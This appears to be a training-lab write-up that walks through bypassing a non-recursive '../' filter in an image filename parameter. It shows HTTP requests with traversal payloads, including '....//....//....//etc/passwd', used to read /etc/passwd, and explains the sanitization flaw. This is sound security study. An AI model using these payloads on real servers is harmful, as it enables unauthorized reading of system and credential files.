# 🧪 Lab: File Path Traversal (Traversal Sequences Stripped Non-Recursively)

## 🎯 Objective

Exploit a path traversal vulnerability to retrieve the contents of:

```
/etc/passwd
```

<img width="971" height="418" alt="1 lab" src="https://github.com/user-attachments/assets/1eaacdbd-21e9-46a8-abda-670ac0c4f4a7" />

---

## 🔍 Lab Overview

* The application loads product images using a filename parameter.
* It attempts to **sanitize traversal sequences (`../`)**, but does so **non-recursively**.

👉 **Key flaw:** Incomplete filtering allows bypass using crafted payloads.

---

## 🚶 Step-by-Step Solution

### 🖼️ 1. Capture Image Request

* Navigate to any product page.
* Intercept the request for an image:

  ```
  GET /image?filename=x.jpg HTTP/2
  ```

<img width="779" height="720" alt="2 repater jpg" src="https://github.com/user-attachments/assets/6101d24f-2cbc-4be3-b00a-745092361b0f" />

---

### 🧪 2. Attempt Basic Path Traversal

* Modify the request:

  ```
  GET /image?filename=../../../etc/passwd
  ```

* Send request.

<img width="777" height="721" alt="3 modify" src="https://github.com/user-attachments/assets/b684795e-0fce-4d9f-9063-35d27735f8e6" />

* Result:

  ```
  400 Bad Request
  No such file
  ```

<img width="779" height="629" alt="4 no-such-file" src="https://github.com/user-attachments/assets/68956c5d-3edf-48f5-99e9-02101326182c" />

👉 **Why it fails?**
The application removes `../` sequences.

---

### 🚫 3. Try Absolute Path

* Modify request:

  ```
  GET /image?filename=/etc/passwd
  ```

<img width="779" height="723" alt="5 modify-again" src="https://github.com/user-attachments/assets/fd523903-1bc7-4f33-947b-9f9593f4dc26" />

* Result:

  ```
  400 Bad Request
  No such file
  ```

<img width="782" height="622" alt="6 no-such-file" src="https://github.com/user-attachments/assets/1d2ea306-8def-4ca7-92c2-1b3135e364a4" />

👉 **Why it fails?**
Absolute paths are also blocked or sanitized.

---

### 🧠 4. Bypass the Filter (Non-Recursive Strip)

* Use crafted payload:

  ```
  ....//....//....//etc/passwd
  ```

* Final request:

  ```
  GET /image?filename=....//....//....//etc/passwd HTTP/2
  ```

<img width="775" height="719" alt="7 modify-again" src="https://github.com/user-attachments/assets/648df8c8-705d-42f0-bd63-59b29799283e" />

---

### 🚀 5. Send Exploit Request

* Send the modified request.

* Result:

  ```
  HTTP/2 200 OK
  ```

* Response contains:

  ```
  Contents of /etc/passwd
  ```

<img width="785" height="623" alt="8 200-ok" src="https://github.com/user-attachments/assets/af6a9869-7a2d-45cd-ac3a-d8114523fc00" />

---

### 📄 6. Analyze Why the Payload Works

👉 **Breakdown:**

* `....//` is interpreted as:

  * After filtering removes `../`, leftover becomes valid traversal
* Because filtering is **non-recursive**, it only strips once
* Remaining path still resolves to:

  ```
  ../../../etc/passwd
  ```

👉 **Key Insight:**

* Improper sanitization allows bypass using **obfuscated traversal sequences**

---

### ✅ 7. Lab Solved

* Successfully accessed:

  ```
  /etc/passwd
  ```
* Lab is complete.

<img width="911" height="701" alt="9 success" src="https://github.com/user-attachments/assets/bb717f83-b961-4d2e-ae28-50712ed3e056" />


---

## 🧠 Why This Attack Works

* The application:

  * Removes `../` only once
  * Does not re-validate the sanitized input
* This allows attackers to:

  * Hide traversal patterns inside larger strings
  * Bypass filters and access sensitive files

---
